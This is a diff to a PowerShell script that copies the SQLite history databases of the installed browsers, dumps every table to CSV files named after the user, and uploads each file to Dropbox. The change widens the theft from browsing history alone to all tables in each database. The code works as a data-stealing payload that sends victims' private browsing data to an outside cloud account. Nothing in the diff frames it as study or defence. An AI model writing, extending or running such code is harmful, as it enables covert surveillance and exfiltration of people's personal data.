@@ -71,6 +71,74 @@ function DropBox-Upload {
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
+# Function to extract and save all tables from the database
+function Export-AllTables {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$TempDB,
+        
+        [Parameter(Mandatory=$true)]
+        [string]$Browser
+    )
+
+    # Connect to SQLite
+    $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
+    $Connection.Open()
+
+    try {
+        # Get all table names
+        $Command = $Connection.CreateCommand()
+        $Command.CommandText = "SELECT name FROM sqlite_master WHERE type='table';"
+        $Reader = $Command.ExecuteReader()
+
+        $Tables = @()
+        while ($Reader.Read()) {
+            $Tables += $Reader["name"]
+        }
+        $Reader.Close()
+
+        # Loop through each table and export its data
+        foreach ($Table in $Tables) {
+            Write-Output "Exporting table: $Table from $Browser"
+
+            $Query = "SELECT * FROM [$Table];"
+            $Command.CommandText = $Query
+            $Reader = $Command.ExecuteReader()
+
+            $TableData = @()
+            while ($Reader.Read()) {
+                $Row = @{}
+                for ($i = 0; $i -lt $Reader.FieldCount; $i++) {
+                    $ColumnName = $Reader.GetName($i)
+                    $ColumnValue = $Reader.GetValue($i)
+                    $Row[$ColumnName] = $ColumnValue
+                }
+                $TableData += New-Object PSObject -Property $Row
+            }
+            $Reader.Close()
+
+            # Save table data to CSV
+            $CsvPath = "$env:TEMP\$env:USERNAME-$Browser-$Table-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-History.csv"
+            if ($TableData.Count -gt 0) {
+                $TableData | Export-Csv -Path $CsvPath -NoTypeInformation
+                Write-Output "Saved: $CsvPath"
+                $CsvPath | DropBox-Upload
+            } else {
+                Write-Output "Table $Table from $Browser has 0 entries, skipping..."
+            }
+            Write-Output ""
+        }
+    }
+    catch {
+        Write-Error "Error exporting tables from ${Browser}: $_"
+    }
+    finally {
+        $Command.Dispose()
+        $Connection.Close()
+        $Connection.Dispose()
+    }
+}
+
 # Iterate through detected browsers
 foreach ($Browser in $BrowserHistoryPaths.Keys) {
     $HistoryDB = $BrowserHistoryPaths[$Browser]
@@ -80,71 +148,7 @@ foreach ($Browser in $BrowserHistoryPaths.Keys) {
             # Create a temporary copy to avoid file lock issues
             $TempDB = "$env:TEMP\${Browser}_History.db"
             Copy-Item -Path $HistoryDB -Destination $TempDB -Force
-
-            # Define SQLite query
-            if ($Browser -eq "Firefox") {
-                # Firefox stores history in "moz_places" table
-                # $Query = "SELECT url, title, datetime(visit_date/1000000, 'unixepoch', 'localtime') AS last_visited FROM moz_places INNER JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC"
-                $Query = "SELECT moz_places.*, moz_historyvisits.*, datetime(moz_historyvisits.visit_date / 1000000, 'unixepoch', 'localtime') AS visit_date, datetime(moz_places.last_visit_date / 1000000, 'unixepoch', 'localtime') AS last_visit_date FROM moz_places FULL OUTER JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC"
-                # $Query = "SELECT * FROM moz_places LEFT JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id UNION SELECT * FROM moz_places RIGHT JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC"
-            } else {
-                # Chromium-based browsers
-                # $Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"
-                $Query = "SELECT urls.url as url_string, urls.*, visits.url as url_id, visits.*, datetime(visits.visit_time/1000000 - 11644473600, 'unixepoch', 'localtime') AS visit_time, datetime(urls.last_visit_time/1000000 - 11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls FULL OUTER JOIN visits ON urls.id = visits.id ORDER BY visits.visit_time DESC"
-                # $Query = "SELECT * FROM urls LEFT JOIN visits ON urls.id = visits.id UNION SELECT * FROM urls RIGHT JOIN visits ON urls.id = visits.id ORDER BY visits.visit_time DESC"
-            }
-
-            # Connect to SQLite database
-            $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
-            $Connection.Open()
-
-            # Execute query
-            $Command = $Connection.CreateCommand()
-            $Command.CommandText = $Query
-            $Reader = $Command.ExecuteReader()
-
-            # Store history
-            $History = @()
-            while ($Reader.Read()) {
-                # Create an empty hash table to hold column data
-                $columnData = @{}
-            
-                # Iterate over all columns and dynamically add them to the hash table
-                for ($i = 0; $i -lt $Reader.FieldCount; $i++) {
-                    $columnName = $Reader.GetName($i)
-                    $columnValue = $Reader.GetValue($i)
-                    
-                    # Add each column to the hash table with the column name as the key
-                    $columnData[$columnName] = $columnValue
-                }
-            
-                # Add the browser information to the hash table and create the custom object
-                $columnData["Browser"] = $Browser
-            
-                # Add the hash table as a custom object
-                $History += New-Object PSObject -Property $columnData
-            }
-
-            # Close connection properly
-            $Reader.Close()
-            $Command.Dispose()
-            $Connection.Close()
-            $Connection.Dispose()
-
-            Start-Sleep -Milliseconds 500
-
-            # show output history
-	        # Write-Output "Browsing History from ${Browser}:"
-	        # $History | Format-Table -AutoSize
-
-            # Save history to CSV
-            $CsvPath = "$env:TEMP\$env:USERNAME-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-$Browser-History.csv"
-            $History | Export-Csv -Path $CsvPath -NoTypeInformation
-
-            # Output result
-            Write-Output "History saved: $CsvPath"
-
-            $CsvPath | DropBox-Upload
+            Export-AllTables -TempDB $TempDB -Browser $Browser
         }
         catch {
             Write-Error "An error occurred while processing ${Browser}: $_"
